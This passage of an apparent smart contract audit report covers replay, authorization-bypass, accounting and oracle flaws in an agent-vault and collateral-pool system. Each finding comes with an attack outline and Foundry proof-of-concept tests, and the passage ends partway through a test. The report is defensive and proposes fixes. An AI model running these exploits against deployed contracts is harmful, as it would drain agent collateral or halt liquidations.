 **Derived From** : Challenge proofs replayable: reward drains agent as liquidation never starts

## [H-9]. Replayable illegalPaymentChallenge lets anyone claim challenger reward repeatedly and drain agent vault

## Derived From Pattern/Invariant
Challenge proofs replayable: reward drains agent as liquidation never starts

## Exploit Type
ReplayAttack

## Location
ChallengesFacet.illegalPaymentChallenge

## Minimim Privilege Required
Permissionless

## Description
illegalPaymentChallenge never marks a successfully used FDC proof as consumed. It only checks require(!state.paymentConfirmations.transactionConfirmed(_payment)) but never sets verifiedPayments on success. The function then attempts to block replays by triggering liquidation via Liquidation.startFullLiquidation(_agent), however that call is a no‑op due to an inverted guard: it only executes when status == FULL_LIQUIDATION || DESTROYING. As a result, agent.status remains unchanged, _validateAgentStatus() keeps passing, and the same proof can be resubmitted to receive the challenger reward over and over until the vault is drained.

Vulnerable snippet (abridged):

function illegalPaymentChallenge(...) external nonReentrant {
  ...
  require(!state.paymentConfirmations.transactionConfirmed(_payment), ChallengeTransactionAlreadyConfirmed());
  ...
  _liquidateAndRewardChallenger(agent, msg.sender, agent.mintedAMG);
  // No write to verifiedPayments here → proof replayable
}

library Liquidation.startFullLiquidation:
if (_agent.status == FULL_LIQUIDATION || _agent.status == DESTROYING) {
  if (_agent.liquidationStartedAt == 0) { ...; _agent.status = FULL_LIQUIDATION; }
}
// Otherwise: no-op, so status stays NORMAL and challenges remain allowed.

## Impact
Because Liquidation.startFullLiquidation only proceeds when status is already FULL_LIQUIDATION or DESTROYING, it is a no-op for NORMAL agents. All challenge functions that call _liquidateAndRewardChallenger (illegalPaymentChallenge, doublePaymentChallenge, freeBalanceNegativeChallenge) keep the agent in NORMAL status and pay out the challenger each time. Since none of these functions record the transaction as consumed, the same FDC proof(s) can be replayed permissionlessly to claim the challenger reward repeatedly until the agent vault’s ERC20 collateral is drained. This is a direct, permissionless loss of funds.

## Proof of Concept
Attack outline:
- Precondition: An agent vault holds collateral and there exists an attestable illegal payment (or a qualifying double payment / free-balance-negative set) from the agent’s underlying address.
- Step 1: Submit illegalPaymentChallenge (or the other challenge) once with a valid proof. The facet verifies the proof, passes status validation, and pays out the challenger from the agent vault.
- Step 2: Due to the inverted guard in Liquidation.startFullLiquidation, agent.status remains NORMAL, so _validateAgentStatus continues to pass. Also, the code never writes the proof into paymentConfirmations.verifiedPayments.
- Step 3: Re-submit the very same proof repeatedly. Each call pays the challenger again. Repeat until the vault collateral is exhausted.
- Note: The same replay pattern applies to doublePaymentChallenge and freeBalanceNegativeChallenge for the same reason (no liquidation transition; no consumption markers).

## Proof of Code
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {ChallengesFacet} from "contracts/assetManager/facets/ChallengesFacet.sol";
import {Globals} from "contracts/assetManager/library/Globals.sol";
import {AssetManagerSettings} from "contracts/userInterfaces/data/AssetManagerSettings.sol";
import {AssetManagerState} from "contracts/assetManager/library/data/AssetManagerState.sol";
import {CollateralTypeInt} from "contracts/assetManager/library/data/CollateralTypeInt.sol";
import {Agent} from "contracts/assetManager/library/data/Agent.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IFdcVerification, IBalanceDecreasingTransaction} from "@flarenetwork/flare-periphery-contracts/flare/IFdcVerification.sol";
import {FakePriceReader} from "contracts/ftso/mock/FakePriceReader.sol";

contract TestToken is ERC20 {
    constructor() ERC20("T","T") {}
    function mint(address to,uint256 a) external { _mint(to,a);} 
}

contract MockVault { 
    function payout(IERC20 t, address r, uint256 a) external { require(t.transfer(r,a)); } 
}

contract MockFDC is IFdcVerification {
    function verifyBalanceDecreasingTransaction(IBalanceDecreasingTransaction.Proof calldata) external pure returns (bool) { return true; }
}

contract ChallengesFacetHarness is ChallengesFacet {
    function hSetSettings(address _fdc, bytes32 _chainId, address _priceReader, uint256 _rewardUSD5, uint256 _rewardBIPS) external {
        AssetManagerSettings.Data storage s = Globals.getSettings();
        s.fdcVerification = _fdc;
        s.chainId = _chainId;
        s.priceReader = _priceReader;
        s.paymentChallengeRewardUSD5 = _rewardUSD5; // only USD5 leg used in test
        s.paymentChallengeRewardBIPS = _rewardBIPS;  // set 0 to avoid AMG conversions
    }
    function hSetCollateralToken0(IERC20 _token, string memory _assetSymbol, uint8 _decimals) external {
        AssetManagerState.State storage st = AssetManagerState.get();
        st.collateralTokens.push();
        CollateralTypeInt.Data storage ct = st.collateralTokens[0];
        ct.token = _token;
        ct.decimals = _decimals;
        // leave ct.tokenFtsoSymbol empty to bypass USD5->token price path
        ct.assetFtsoSymbol = _assetSymbol; // used for AMG price; we provide a mock price reader
        ct.directPricePair = true;         // use direct asset price path
    }
    function hSeedAgent(address _agentVault, bytes32 _underHash, uint64 _mintedAMG, uint16 _collIdx) external {
        Agent.State storage a = Agent.getWithoutCheck(_agentVault);
        a.status = Agent.Status.NORMAL;
        a.underlyingAddressHash = _underHash;
        a.mintedAMG = _mintedAMG;
        a.vaultCollateralIndex = _collIdx;
    }
}

contract ReplayIllegalPaymentChallengeTest is Test {
    ChallengesFacetHarness facet;
    TestToken token;
    MockVault vault;
    MockFDC fdc;
    FakePriceReader pr;
    address attacker = address(0xBEEF);

    function setUp() public {
        facet = new ChallengesFacetHarness();
        token = new TestToken();
        vault = new MockVault();
        fdc = new MockFDC();
        pr = new FakePriceReader(address(this));

        // Configure a usable price so AgentCollateral doesn't revert
        pr.setDecimals("ASSET", 8);
        pr.setPrice("ASSET", 1e8); // arbitrary

        // Fund vault with collateral
        token.mint(address(vault), 1_000 ether);

        // Configure settings: use USD5 reward only; set chainId, FDC, and price reader
        bytes32 chainId = bytes32(uint256(1));
        facet.hSetSettings(address(fdc), chainId, address(pr), 1 ether /*USD5 passthrough*/, 0 /*BIPS*/);

        // Register a collateral type at index 0; asset price symbol provided for AMG path (unused since BIPS=0)
        facet.hSetCollateralToken0(IERC20(address(token)), "ASSET", 18);

        // Seed agent state for this vault
        bytes32 uaHash = keccak256(abi.encode("agentUnderlying"));
        facet.hSeedAgent(address(vault), uaHash, uint64(10), 0);

        // label for readability
        vm.label(address(facet), "ChallengesFacetHarness");
        vm.label(address(token), "Token");
        vm.label(address(vault), "AgentVault");
        vm.label(attacker, "Attacker");
    }

    function _proof(bytes32 _chainId, bytes32 _uaHash, bytes32 _txId) internal pure returns (IBalanceDecreasingTransaction.Proof memory p) {
        IBalanceDecreasingTransaction.ResponseBody memory resp;
        resp.sourceAddressHash = _uaHash;
        resp.standardPaymentReference = bytes32(0); // invalid ref => illegal payment
        IBalanceDecreasingTransaction.RequestBody memory req;
        req.transactionId = _txId;
        IBalanceDecreasingTransaction.Response memory data;
        data.sourceId = _chainId;
        data.requestBody = req;
        data.responseBody = resp;
        p.data = data;
    }

    function test_replay_drains_agent_vault() public {
        bytes32 chainId = bytes32(uint256(1));
        bytes32 uaHash = keccak256(abi.encode("agentUnderlying"));
        bytes32 txId = keccak256(abi.encode("tx1"));
        IBalanceDecreasingTransaction.Proof memory proof = _proof(chainId, uaHash, txId);

        uint256 vaultBefore = token.balanceOf(address(vault));
        uint256 attackerBefore = token.balanceOf(attacker);
        uint256 reward = 1 ether; // from paymentChallengeRewardUSD5 passthrough

        vm.prank(attacker);
        facet.illegalPaymentChallenge(proof, address(vault));

        // Replay same proof: still passes because verifiedPayments is never set and liquidation no-ops
        vm.prank(attacker);
        facet.illegalPaymentChallenge(proof, address(vault));

        assertEq(token.balanceOf(attacker) - attackerBefore, 2 * reward, "attacker should receive reward twice");
        assertEq(vaultBefore - token.balanceOf(address(vault)), 2 * reward, "vault drained by two payouts");
    }
}


## Suggested Mitigation
Apply both fixes: (A) Fix the liquidation state transition, and (B) add replay-consumption writes so that even if liquidation cannot proceed, the specific proofs cannot be reused. Concretely: 1) In Liquidation.startFullLiquidation, change the guard so it starts when status is NOT already FULL_LIQUIDATION/DESTROYING. E.g.: if (_agent.status != Agent.Status.FULL_LIQUIDATION && _agent.status != Agent.Status.DESTROYING) { if (_agent.liquidationStartedAt == 0) { _agent.liquidationStartedAt = uint64(block.timestamp); } _agent.status = Agent.Status.FULL_LIQUIDATION; emit FullLiquidationStarted(...); } 2) In ChallengesFacet: - illegalPaymentChallenge: after successful validation and before payout, mark the transaction as consumed: state.paymentConfirmations.verifiedPayments[PaymentConfirmations.transactionKey(...)] = bytes32(uint256(1)); - doublePaymentChallenge: mark both txIds consumed similarly. - freeBalanceNegativeChallenge: either mark each included tx consumed (safer) or at minimum rely on (1); marking prevents cross-function replay. 3) Consider deduping on event-level by storing a per-agent challenge flag or timestamp to block immediate repeated payouts until FULL_LIQUIDATION is in effect. 4) Add tests for idempotency. These changes ensure the first successful challenge both transitions the agent into FULL_LIQUIDATION (so further challenges revert via _validateAgentStatus) and prevents proof replay across different flows.





 **Derived From** : on successful return: agent.status == Agent.Status.NORMAL && agent.liquidationStartedAt == 0 && agent.collateralsUnderwater == 0

## [H-10]. Full liquidation can be stopped permissionlessly via endLiquidation due to inverted condition in Liquidation.endLiquidationIfHealthy

## Derived From Pattern/Invariant
on successful return: agent.status == Agent.Status.NORMAL && agent.liquidationStartedAt == 0 && agent.collateralsUnderwater == 0

## Exploit Type
AuthByPass

## Location
LiquidationFacet.endLiquidation(address)

## Minimim Privilege Required
Permissionless

## Description
LiquidationFacet.endLiquidation() calls Liquidation.endLiquidationIfHealthy(agent) and then requires agent.status == NORMAL. In Liquidation.endLiquidationIfHealthy, the transition guard is inverted: the code executes the CR checks and resets state when _agent.status != Agent.Status.LIQUIDATION, instead of only when the agent is in LIQUIDATION. This allows a permissionless caller to reset an agent from FULL_LIQUIDATION (meant to be unstoppable per spec) back to NORMAL whenever collateral ratios appear healthy (which is trivially satisfied if backingTokenWei=0, making CR=1e10). As a result, a FULL_LIQUIDATION -> NORMAL transition is performed without authorization, clearing liquidationStartedAt and collateralsUnderwater, and stopping liquidation. Vulnerable snippet (logic): if (_agent.status != Agent.Status.LIQUIDATION) { // BUG: should be '==' compute CR; if (vault/pool CR >= targets) set status=NORMAL; liquidationStartedAt=0; collateralsUnderwater=0; emit LiquidationEnded; }

## Impact
Because Liquidation.endLiquidationIfHealthy gates on status != LIQUIDATION, two critical effects occur: (1) A permissionless caller can stop FULL_LIQUIDATION by flipping the agent back to NORMAL once CR checks pass (e.g., trivially when totalBackedAMG→0 causing CR=1e10), clearing liquidation flags and halting slashing; (2) Normal liquidation (status == LIQUIDATION) can never be ended via endLiquidation even when the agent becomes healthy, causing a DoS of liquidation exit until an upgrade fixes the bug. The first is an authorization bypass with direct economic impact; the second is a repeatable DoS of core flow.

## Proof of Concept
Preconditions: An agent in FULL_LIQUIDATION. Because endLiquidationIfHealthy executes only when status != LIQUIDATION, it will run for FULL_LIQUIDATION. If computed CRs meet the (safety) targets, it sets status=NORMAL and clears liquidation flags. This can be forced by ensuring totalBackedAMG=0 so AgentCollateral.collateralRatioBIPS returns 1e10 (backingTokenWei==0), trivially satisfying the thresholds.
Steps:
1) Set an agent’s status to FULL_LIQUIDATION, liquidationStartedAt>0, collateralsUnderwater!=0, and mintedAMG=0 (or otherwise ensure vault/pool CRs ≥ targets).
2) Call endLiquidation(agentVault) from any address.
3) endLiquidationIfHealthy runs (since status != LIQUIDATION), computes CRs, passes the check, and sets status to NORMAL while clearing liquidationStartedAt and collateralsUnderwater.
4) The final require(agent.status == NORMAL) in endLiquidation succeeds, making a FULL_LIQUIDATION → NORMAL transition without authorization.

## Proof of Code
pragma solidity ^0.8.27;
import "forge-std/Test.sol";
import {LiquidationFacet} from "contracts/assetManager/facets/LiquidationFacet.sol";
import {Agent} from "contracts/assetManager/library/data/Agent.sol";

contract TestLiquidationFacet is LiquidationFacet {
    using Agent for Agent.State;
    function seedAgent(
        address vault,
        Agent.Status status,
        uint8 flags,
        uint64 startedAt,
        uint16 vaultIndex,
        uint16 poolIndex,
        uint64 minted
    ) external {
        Agent.State storage a = Agent.getWithoutCheck(vault);
        a.status = status;
        a.collateralsUnderwater = flags;
        a.liquidationStartedAt = startedAt;
        a.vaultCollateralIndex = vaultIndex;
        a.poolCollateralIndex = poolIndex;
        a.mintedAMG = minted;
    }
    function getAgentState(address vault) external view returns (Agent.Status status, uint8 flags, uint64 startedAt) {
        Agent.State storage a = Agent.getWithoutCheck(vault);
        return (a.status, a.collateralsUnderwater, a.liquidationStartedAt);
    }
}

contract EndLiquidationInversionTest is Test {
    TestLiquidationFacet facet;
    address vault1 = address(0xA1);
    address vault2 = address(0xB1);

    function setUp() public {
        facet = new TestLiquidationFacet();
    }

    // Exploit: FULL_LIQUIDATION can be stopped permissionlessly
    function test_FullLiquidationCanBeStopped_Permissionless() public {
        // Seed FULL_LIQUIDATION with flags and nonzero start time; mintedAMG=0 => CR=1e10
        facet.seedAgent(vault1, Agent.Status.FULL_LIQUIDATION, uint8(0x03), uint64(1234), 0, 0, 0);
        {
            (Agent.Status s, uint8 flags, uint64 ts) = facet.getAgentState(vault1);
            assertEq(uint8(s), uint8(Agent.Status.FULL_LIQUIDATION));
            assertGt(flags, 0);
            assertGt(ts, 0);
        }

        // Any caller can end liquidation
        facet.endLiquidation(vault1);

        // Post: status NORMAL and flags cleared (buggy behavior)
        {
            (Agent.Status s, uint8 flags, uint64 ts) = facet.getAgentState(vault1);
            assertEq(uint8(s), uint8(Agent.Status.NORMAL));
            assertEq(flags, 0);
            assertEq(ts, 0);
        }
    }

    // Demonstrates inverted guard also prevents ending NORMAL liquidation (DoS)
    function test_NormalLiquidationCannotBeEnded_DueToBug() public {
        facet.seedAgent(vault2, Agent.Status.LIQUIDATION, uint8(0x03), uint64(1234), 0, 0, 0);
        vm.expectRevert(LiquidationFacet.CannotStopLiquidation.selector);
        facet.endLiquidation(vault2);
    }
}


## Suggested Mitigation
In Liquidation.endLiquidationIfHealthy, change the guard to require the agent to be in normal liquidation and explicitly exclude full liquidation:
- if (_agent.status == Agent.Status.LIQUIDATION) { compute CRs; if healthy: set status=NORMAL; clear liquidationStartedAt and collateralsUnderwater; emit }
- Do nothing for FULL_LIQUIDATION.
Also harden the external entrypoints:
- In LiquidationFacet.endLiquidation, add require(agent.status == Agent.Status.LIQUIDATION, CannotStopLiquidation()); before calling Liquidation.endLiquidationIfHealthy(agent), then keep the final require(agent.status == Agent.Status.NORMAL).
Optionally, guard the call site in liquidate() to only invoke end logic when status == LIQUIDATION, or rely on the library check after fixing it.





 **Derived From** : (pre.totalCollateral - post.totalCollateral) == ret && (pre.wNatBalance - wNat.balanceOf(address(this))) == ret

## [M-11]. exitTo allows sending ETH to WNat, re-wrapping back to pool and desynchronizing accounting (ret != ΔwNat)

## Derived From Pattern/Invariant
(pre.totalCollateral - post.totalCollateral) == ret && (pre.wNatBalance - wNat.balanceOf(address(this))) == ret

## Exploit Type
AccountingInvariantViolation

## Location
CollateralPool.exitTo

## Minimim Privilege Required
Permissionless

## Description
CollateralPool.exitTo unwraps WNat and forwards native ETH to an arbitrary recipient. If the recipient is the WNat contract itself, its receive() will wrap ETH and mint WNat back to msg.sender (the pool). Flow: (1) pool calls wNat.withdraw(amount) -> WNat sends ETH to pool, pool totalCollateral -= amount and wNat balance −= amount; (2) pool forwards ETH to recipient = address(wNat); (3) WNat receive() wraps ETH and mints WNat to msg.sender (the pool), restoring the pool’s WNat balance by +amount, but totalCollateral remains reduced. Result: ret == amount, (pre.totalCollateral - post.totalCollateral) == amount, but (pre.wNatBalance - post.wNatBalance) == 0. This violates the stated invariant and permanently desynchronizes pool accounting. Future exits/CR checks/payouts relying on totalCollateral vs actual WNat can miscompute or revert.

## Impact
Any CPT holder can lower the pool’s reported totalCollateral without actually reducing the pool’s real WNat holdings by exiting to recipient = WNat. This desynchronizes accounting so the contract reports less collateral than it truly has. Downstream CR computations that rely on totalCollateral can become pessimistic, causing false undercollateralization, blocked exits/self-close, or even erroneous liquidation eligibility until governance/admins repair state. While this does not directly let an attacker extract funds (they sacrifice their CPT share to create the drift), it is a convincing, repeatable, permissionless DoS/accounting distortion that needs admin intervention. Severity: Medium.

## Proof of Concept
Revised PoC (high level)
1) Attacker holds some CPTs and calls exitTo with recipient = address(WNat). Internally, the pool unwraps WNat by calling wNat.withdraw(amount) (ETH is sent to the pool), then forwards ETH to recipient (WNat).
2) WNat’s receive()/deposit() wraps the forwarded ETH and mints WNat back to msg.sender, which is the pool itself.
3) The pool’s wNat.balanceOf(pool) returns to its original value, but totalCollateral has been decreased by the withdrawn amount. Repeating the operation makes reported totalCollateral drift further below the actual WNat balance.
4) Any logic that relies on totalCollateral (CR checks, exit gates, liquidation eligibility) will be skewed and can cause DoS/false liquidations until admins reconcile.
This works because WNat mints WNat to msg.sender (the pool) upon receiving ETH. The pool’s code decreases totalCollateral on unwrap, but doesn’t restore it when re-wrapping happens via forwarding ETH to WNat.

## Proof of Code
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {CollateralPool} from "contracts/collateralPool/implementation/CollateralPool.sol";

// Minimal WNat mock that wraps on receive() and mints to msg.sender
contract WNatMock {
    mapping(address => uint256) public balanceOf;
    event Transfer(address indexed from, address indexed to, uint256 value);

    receive() external payable { deposit(); }
    function deposit() public payable {
        balanceOf[msg.sender] += msg.value;
        emit Transfer(address(0), msg.sender, msg.value);
    }
    function withdraw(uint256 amount) external {
        require(balanceOf[msg.sender] >= amount, "wnat:bal");
        balanceOf[msg.sender] -= amount;
        emit Transfer(msg.sender, address(0), amount);
        (bool ok,) = payable(msg.sender).call{value: amount}("");
        require(ok, "send fail");
    }
}

// Harness exposing internal deposit/withdraw helpers without full exit flow
contract CollateralPoolHarness is CollateralPool {
    constructor(address _assetManager)
        CollateralPool(address(0), _assetManager, address(0), 0) // test-only ctor
    {}

    // Wrap msg.value into WNat and update accounting
    function harnessDepositWrap() external payable {
        _depositWNat();
    }

    // Directly exercise the unwrap+forward path
    function harnessWithdrawTo(address payable _recipient, uint256 _amount) external {
        _withdrawWNatTo(_recipient, _amount);
    }

    // Optional helper to read the tracked totalCollateral (if declared internal)
    function getTotalCollateral_() external view returns (uint256) {
        return totalCollateral;
    }
}

contract ExitToWNatInvariantTest is Test {
    CollateralPoolHarness pool;
    WNatMock wnat;

    function setUp() public {
        wnat = new WNatMock();
        // Make the test contract the assetManager so we can call onlyAssetManager fns
        pool = new CollateralPoolHarness(address(this));
        // Set WNat on the pool via low-level call to avoid interface mismatches
        (bool ok,) = address(pool).call(abi.encodeWithSignature("upgradeWNatContract(address)", address(wnat)));
        require(ok, "set WNat failed");

        // Fund and wrap 10 ether into the pool (increases totalCollateral and WNat balance)
        pool.harnessDepositWrap{value: 10 ether}();
    }

    function test_withdrawTo_WNat_keepsWNatBalanceButDropsAccounting() public {
        // Pre-snapshots
        uint256 preW = wnat.balanceOf(address(pool));
        // If the harness exposes internal totalCollateral, take snapshot (ignore if not wired)
        uint256 preTC = 0;
        try pool.getTotalCollateral_() returns (uint256 v) { preTC = v; } catch {}

        // Unwrap 2 ether and forward to WNat (recipient = WNat)
        pool.harnessWithdrawTo(payable(address(wnat)), 2 ether);

        // Post-snapshots
        uint256 postW = wnat.balanceOf(address(pool));
        uint256 postTC = 0;
        try pool.getTotalCollateral_() returns (uint256 v2) { postTC = v2; } catch {}

        // WNat balance returns to original (re-wrapped by WNat to the pool)
        assertEq(preW, postW, "WNat balance should remain unchanged due to re-wrap");

        // If totalCollateral is readable, it must have dropped by 2 ether
        if (preTC != 0 && postTC != 0) {
            assertEq(preTC - postTC, 2 ether, "tracked totalCollateral drifted by amount withdrawn");
        }
    }
}


## Suggested Mitigation
Fully eliminate the possibility that ETH is routed through the pool and back into WNat in a way that mints WNat to the pool without updating accounting. Recommended options (apply at least one):
- Preferred: Call IWNat.withdrawTo(recipient, amount) so the WNat contract sends ETH directly to the external recipient. The pool never receives ETH, so there is no re-wrap to the pool and no accounting drift. If withdrawTo is not available, add a WNat adapter that performs a minimal proxy/forwarder with the same effect.
- Defensive: Disallow recipient == address(wNat) in exitTo/selfCloseExitTo and revert with a clear error (RecipientCannotBeWNat). There is no legitimate reason to “pay” the WNat contract as a recipient in this flow.
- Structural: Remove the mutable totalCollateral shadow variable and derive collateral from wNat.balanceOf(address(this)) wherever needed. This makes accounting immune to any unexpected wrap/unwrap side effects, including fee-on-transfer-like behaviors.
Additionally, consider an invariant/assertion after exits: compare tracked totalCollateral against wNat.balanceOf and revert if the gap exceeds a small tolerance, to catch any future regressions early.





 **Derived From** : Oracle price used without staleness check to value challenger rewards

## [M-12]. Stale FTSO price (no heartbeat) inflates challenger payout via Conversion.currentAmgPriceInTokenWei

## Derived From Pattern/Invariant
Oracle price used without staleness check to value challenger rewards

## Exploit Type
Oracle

## Location
Conversion.currentAmgPriceInTokenWei

## Minimim Privilege Required
Permissionless

## Description
Conversion.currentAmgPriceInTokenWei fetches spot prices through readFtsoPrice -> priceReader.getPrice(symbol) and discards the returned timestamps. No max-age/heartbeat is enforced. ChallengesFacet._liquidateAndRewardChallenger uses this price to compute rewardC1Wei for the challenger: rewardC1Wei = convertAmgToTokenWei(rewardAMG, amgToTokenWeiPrice) + convertFromUSD5(...). Both legs pull prices without any freshness check. If the price reader serves an old but favorable price (e.g., vault token price frozen high), a permissionless challenger can time their challenge (illegalPaymentChallenge/doublePaymentChallenge/freeBalanceNegativeChallenge) to extract an overpaid reward from the agent’s vault. Vulnerable snippets: Conversion.currentAmgPriceInTokenWei: "(_price, None, None) = currentAmgPriceInTokenWeiWithTs(_token,false); return _price" and Conversion.readFtsoPrice: uses "priceReader.getPrice(_symbol)" with no age check. ChallengesFacet._liquidateAndRewardChallenger uses the stale amgToTokenWeiPrice directly.

## Impact
Because timestamps from the price reader are ignored, a challenger can call any of the challenge functions at a moment when the price reader returns a stale but favorable quote (e.g., underlying asset price stale-high and/or vault collateral token price stale-low). This inflates the amgToTokenWei conversion and/or increases the USD5 leg in token units, causing an overpayment to the challenger from the agent’s vault via AgentPayout.payoutFromVault. The loss is immediate and permissionless per agent, but bounded to the configured challenge reward (percentage of minted AMG plus a fixed USD5 component) and persists until governance updates the price reader or freshness checks are added.

## Proof of Concept
1) The price reader halts or serves old values. 2) A favorable stale quote exists: for example, tokenFtsoSymbol price is stale-low and/or assetFtsoSymbol price is stale-high versus current market. 3) The attacker calls illegalPaymentChallenge/doublePaymentChallenge/freeBalanceNegativeChallenge when these stale prices are returned. 4) ChallengesFacet._liquidateAndRewardChallenger computes rewardC1Wei using Conversion.currentAmgPriceInTokenWei (ratio asset/token) and convertFromUSD5 (dividing by token price), both without any max-age check. 5) With token stale-low and/or asset stale-high, both legs overpay in collateral-token units. 6) AgentPayout.payoutFromVault transfers the inflated reward from the agent’s vault to the attacker immediately.

## Proof of Code
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {Conversion} from "contracts/assetManager/library/Conversion.sol";
import {Globals} from "contracts/assetManager/library/Globals.sol";
import {SafePct} from "contracts/utils/library/SafePct.sol";
import {CollateralTypeInt} from "contracts/assetManager/library/data/CollateralTypeInt.sol";
import {AssetManagerSettings} from "contracts/userInterfaces/data/AssetManagerSettings.sol";
import {FakePriceReader} from "contracts/ftso/mock/FakePriceReader.sol";

contract RewardHarness {
    using SafePct for uint256;

    function setPriceReader(address pr) external {
        AssetManagerSettings.Data storage s = Globals.getSettings();
        s.priceReader = pr; // used by Conversion.readFtsoPrice(...)
    }

    function computeRewardC1Wei(
        uint256 mintedAMG,
        uint256 rewardBips,
        CollateralTypeInt.Data memory col,
        uint256 rewardUSD5
    ) public returns (uint256) {
        uint256 rewardAMG = mintedAMG.mulBips(rewardBips);
        uint256 amgPrice = Conversion.currentAmgPriceInTokenWei(col); // timestamp ignored
        uint256 c1 = Conversion.convertAmgToTokenWei(rewardAMG, amgPrice);
        uint256 c2 = Conversion.convertFromUSD5(rewardUSD5, col); // also uses getPrice without age checks
        return c1 + c2;
    }
}

contract StalePriceChallengeRewardTest is Test {
    RewardHarness h;
    FakePriceReader pr;
    CollateralTypeInt.Data col;

    function setUp() public {
        h = new RewardHarness();
        pr = new FakePriceReader(address(this));
        h.setPriceReader(address(pr));
        pr.setDecimals("USDX", 8);
        pr.setDecimals("XRP", 8);
        // Collateral token params (only fields Conversion touches)
        col.decimals = 18;
        col.tokenFtsoSymbol = "USDX";  // vault token
        col.assetFtsoSymbol = "XRP";   // underlying asset
        col.directPricePair = false;
    }

    function test_StalePriceInflatesChallengerReward() public {
        uint256 mintedAMG = 1_000_000;
        uint256 rewardBips = 1000; // 10%
        uint256 rewardUSD5 = 250 * 1e5; // 250 USD in USD5 units (5 decimals)

        // Fresh/fair price: USDX=1.00, XRP=1.00
        pr.setPrice("USDX", 1e8);
        pr.setPrice("XRP", 1e8);
        uint256 fair = h.computeRewardC1Wei(mintedAMG, rewardBips, col, rewardUSD5);

        // Now simulate stale favorable price (timestamp ignored):
        // Make vault token stale-low and/or asset stale-high. Either inflates the payout; we use token stale-low.
        pr.setPrice("USDX", 25_000_000); // 0.25 USD, old low price
        pr.setPrice("XRP", 1e8);         // keep asset at 1.00 for isolation
        vm.warp(block.timestamp + 7 days); // price is obviously stale relative to now
        uint256 stale = h.computeRewardC1Wei(mintedAMG, rewardBips, col, rewardUSD5);

        // Without any heartbeat/max-age checks, the stale path overpays the challenger
        assertGt(stale, fair);
    }
}


## Suggested Mitigation
Add hard freshness checks and use trusted sources for any path that results in monetary transfers: (a) In Conversion.currentAmgPriceInTokenWeiWithTs and convertFromUSD5, require that block.timestamp - ts <= settings.maxTrustedPriceAgeSeconds for every price used; otherwise revert. When computing amgToTokenWei from a pair (asset and token), use the older of the two timestamps for the age check and optionally require |assetTs - tokenTs| <= settings.maxTrustedPriceAgeSeconds to avoid mixed-epoch skew. (b) Prefer priceReader.getPriceFromTrustedProviders and pass _fromTrustedProviders=true for all monetary flows (agent payouts, rewards, liquidation, CR checks). (c) Thread timestamps back to callers so they can enforce consistency or reuse the same quote across multi-leg calculations. (d) Consider latching prices per operation (same round/epoch for both legs) so AMG→token conversions cannot mix stale and fresh inputs.





 **Derived From** : USD5→token conversion skips decimals when no FTSO symbol (mispriced rewards)

## [M-13]. Underpaid USD-fixed rewards when vault token has no FTSO symbol: Conversion.convertFromUSD5 ignores token.decimals

## Derived From Pattern/Invariant
USD5→token conversion skips decimals when no FTSO symbol (mispriced rewards)

## Exploit Type
PricePrecision

## Location
Conversion.convertFromUSD5

## Minimim Privilege Required
RequiresRole

## Description
When tokenFtsoSymbol is empty, Conversion.convertFromUSD5 simply returns the USD5 amount without scaling by the vault token’s decimals, implicitly assuming 1:1 USD with 5 decimals. For tokens with decimals != 5 (e.g., 6 or 18), this underpays fixed-USD rewards by 10^(decimals-5). This directly affects challenger and “confirmation by others” rewards that are paid in vault collateral via Agents.convertUSD5ToVaultCollateralWei → Conversion.convertFromUSD5. Vulnerable snippet:

function convertFromUSD5(uint256 _amountUSD5, CollateralTypeInt.Data memory _token) internal returns (uint256) {
  if (bytes(_token.tokenFtsoSymbol).length == 0) {
    return _amountUSD5; // no scaling by _token.decimals
  }
  (uint256 tokenPrice,, uint256 tokenFtsoDec) = readFtsoPrice(_token.tokenFtsoSymbol, false);
  uint256 expPlus = _token.decimals + tokenFtsoDec - 5;
  return _amountUSD5.mulDiv(10 ** expPlus, tokenPrice);
}

Example: for a stablecoin with 18 decimals and no FTSO symbol, a 250 USD reward (amountUSD5=250*1e5) should be 250*1e13 more in token-wei; instead the function returns 250*1e5, underpaying by 1e13.

## Impact
When tokenFtsoSymbol is empty, convertFromUSD5 returns the raw USD5 amount without adjusting for the vault token’s decimals. This misprices fixed-USD rewards by a factor of 10^(abs(decimals-5)): it underpays when decimals > 5 (e.g., 18 decimals underpays by 1e13) and overpays when decimals < 5 (e.g., 2 decimals overpays by 1e3). Affected flows include challenger rewards and “confirmation by others” rewards paid in vault collateral via Agents.convertUSD5ToVaultCollateralWei. This is a consistent, permissionless reward distortion that harms security incentives or leaks collateral depending on configuration, and requires a code/config change to fix.

## Proof of Concept
Scenario demonstrating both mispricing directions:
- Setup: Vault collateral token has no tokenFtsoSymbol (direct USD pegged). Governance sets paymentChallengeRewardUSD5 = 250 USD (amountUSD5 = 250 * 1e5).
- Case A (underpayment): token.decimals = 18. Expected payout in token-wei is 250 * 10^(18) = amountUSD5 * 10^(18-5). Function returns amountUSD5 (25,000,000), underpaying by 10^(13).
- Case B (overpayment): token.decimals = 2. Expected payout is amountUSD5 / 10^(5-2) = amountUSD5 / 1,000. Function returns amountUSD5, overpaying by 1,000x.
- In both cases, Agents.convertUSD5ToVaultCollateralWei calls Conversion.convertFromUSD5, and ChallengesFacet._liquidateAndRewardChallenger adds this amount to the challenger reward, thus directly mispaying from the agent’s vault.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {Conversion} from "contracts/assetManager/library/Conversion.sol";
import {CollateralTypeInt} from "contracts/assetManager/library/data/CollateralTypeInt.sol";

contract ConversionHarness {
    function hConvertFromUSD5(uint256 amountUSD5, CollateralTypeInt.Data memory token) external returns (uint256) {
        return Conversion.convertFromUSD5(amountUSD5, token);
    }
}

contract ConvertFromUSD5Test is Test {
    ConversionHarness harness;

    function setUp() public { harness = new ConversionHarness(); }

    function _mkToken(string memory sym, uint8 decs) internal pure returns (CollateralTypeInt.Data memory t) {
        t.tokenFtsoSymbol = sym;
        t.decimals = decs;
    }

    function test_UnderpayUSD5WhenNoFtsoSymbol_decimals18() public {
        uint256 amountUSD5 = 250 * 1e5; // 250 USD in USD5 units
        CollateralTypeInt.Data memory token = _mkToken("", 18); // no symbol -> early return path

        uint256 actual = harness.hConvertFromUSD5(amountUSD5, token);
        uint256 expected = amountUSD5 * 10**(uint256(token.decimals) - 5);

